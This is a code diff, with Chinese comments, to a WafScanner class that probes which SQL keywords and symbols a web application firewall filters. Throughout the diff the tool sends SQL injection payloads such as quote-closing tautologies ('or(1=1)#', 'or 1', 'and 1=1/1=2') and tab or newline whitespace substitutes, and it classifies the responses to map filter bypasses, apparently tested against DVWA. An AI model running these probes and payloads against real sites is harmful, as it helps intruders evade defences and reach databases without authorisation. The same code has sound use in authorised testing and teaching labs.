@@ -38,6 +38,10 @@ class WafScanner:
         else:
             pre = self._prefix()
             self.R_err = session.request_value(pre)   # 闭合本身 → 报错参照
+        # 报错参照有效吗？（登录框吞错/无区分环境下 R_err ≡ R_base，"error/base"
+        # 二分失效，此时 base 类结果只能记"未知"）
+        self.err_valid = (self.R_err.has_sql_error()
+                          or similarity(self.R_err, self.R_base) < 0.99)
         self.kw_dict = self._load("waf_keywords.yaml")
         self.sym_dict = self._load("waf_symbols.yaml")
 
@@ -62,7 +66,7 @@ class WafScanner:
             return "block"
         if r.has_sql_error():
             return "error"
-        if self.R_err is not None and self.R_err.length and \
+        if self.err_valid and self.R_err is not None and self.R_err.length and \
                 similarity(r, self.R_err) >= 0.93 and r.status_code == self.R_err.status_code:
             return "error"
         if similarity(r, self.R_base) >= 0.985 and r.status_code == self.R_base.status_code:
@@ -70,13 +74,18 @@ class WafScanner:
         return "other"
 
     def _record(self, report: WafReport, token: str, category: str, cls: str,
-                note: str = "") -> WafItem:
+                note: str = "", trust: bool = False) -> WafItem:
+        """trust=True 表示结论来自自参照法（独立成功参照），不受 err_valid 影响。"""
         if cls == "error":
             filtered, ev = False, f"token 到达数据库解析器（SQL 报错）{note}"
         elif cls == "block":
             filtered, ev = True, f"触发拦截（WAF 特征响应）{note}"
         elif cls == "base":
-            filtered, ev = True, f"token 被剥离/转义（响应与正常基线一致）{note}"
+            if self.err_valid or trust:
+                filtered, ev = True, f"token 被剥离/转义（响应与正常基线一致）{note}"
+            else:
+                # 无报错区分度的环境（登录框吞错等）：语义不可见 ≠ 被剥离
+                filtered, ev = None, "无报错回显，无法区分「语义不可见」与「被剥离」"
         else:
             filtered, ev = None, "响应特征不明确"
         item = WafItem(token=token, category=category, filtered=filtered,
@@ -137,33 +146,54 @@ class WafScanner:
 
     # ------------------------------------------------------------------ special probes
     def _probe_space(self, report: WafReport, token: str, pre: str, tail: str):
-        """空格探针：依赖 or/and 的语义判定。
-        1' or 1# → 多行大页面（other）= 空格通过；报错/拦截 = 被过滤。"""
-        or_item, and_item = report.lookup("or"), report.lookup("and")
-        if or_item is not None and or_item.filtered is False:
+        """空格探针（自参照法，无条件执行）：
+        以无空格恒真 1'or(1=1)# 的响应为成功参照 R_true，
+        含空格恒真 1' or 1# 与之相似 = 通过；否则被滤。
+        空格被滤时继续探测空白替代 %09 / %0a。"""
+        r_true = self.s.request_value(f"{pre}or(1=1){tail}")
+        if r_true.status_code > 0 and not r_true.has_waf_block() \
+                and not r_true.has_sql_error():
             r = self.s.request_value(f"{pre} or 1{tail}")
-            cls = self._classify(r)
-            if cls == "other":
-                self._record(report, token, "符号", "error")   # 全行页面=通过
+            if similarity(r, r_true) >= 0.95 and r.status_code == r_true.status_code:
+                self._record(report, token, "符号", "error",
+                             note="（含空格恒真与无空格恒真页面一致）", trust=True)
                 return
-            self._record(report, token, "符号", cls, note="（含空格 or 探针异常）")
+            self._record(report, token, "符号", "base",
+                         note="（含空格恒真页面偏离成功参照，空格被过滤/拦截）", trust=True)
+            self._probe_whitespace_alts(report, pre, tail, r_true)
             return
+        # or 恒真不可用（如 or 被滤）→ and 真假差异兜底
+        and_item = report.lookup("and")
         if and_item is not None and and_item.filtered is False:
             t = self.s.request_value(f"{pre} and 1=1{tail}")
             f = self.s.request_value(f"{pre} and 1=2{tail}")
             if (self._classify(t) == "base" and t.status_code > 0
                     and (similarity(t, f) < 0.995 or t.status_code != f.status_code)):
                 self._record(report, token, "符号", "error")
+                return
+        self._record(report, token, "符号", "other", note="（无法构造有效恒真参照）")
+
+    def _probe_whitespace_alts(self, report: WafReport, pre: str, tail: str,
+                               r_true):
+        """空格被滤时，探测 tab(%09) / 换行(%0a) 是否可作为空白替代。"""
+        for name, literal in (("%09", "\t"), ("%0a", "\n")):
+            r = self.s.request_value(f"{pre}{literal}or{literal}1{tail}")
+            if similarity(r, r_true) >= 0.95 and r.status_code == r_true.status_code:
+                self._record(report, name, "符号", "error",
+                             note="（空白替代字符可用，自参照恒真一致）", trust=True)
             else:
-                self._record(report, token, "符号", "other", note="（and 探针无真假差异）")
-            return
-        self._record(report, token, "符号", "other", note="（and/or 不可用，无法判定）")
+                self._record(report, name, "符号", "base",
+                             note="（空白替代字符同样被拦截）", trust=True)
 
     def _probe_single_quote(self, report: WafReport, token: str, pre: str, tail: str):
         r = self.s.request_value(self.inj.base_value + "'")
         cls = self._classify(r)
         if cls == "error":
             self._record(report, token, "符号", "error")
+        elif not self.err_valid:
+            # 无报错回显：无法从响应区分「引号逃逸成功但语句恒假」与「被转义」
+            self._record(report, token, "符号", None,
+                         note="（无报错回显，请以闭合探测结果为准）")
         else:
             # 引号未引发报错 → 被转义/过滤（DVWA medium/high 即此情况）
             self._record(report, token, "符号", "base",
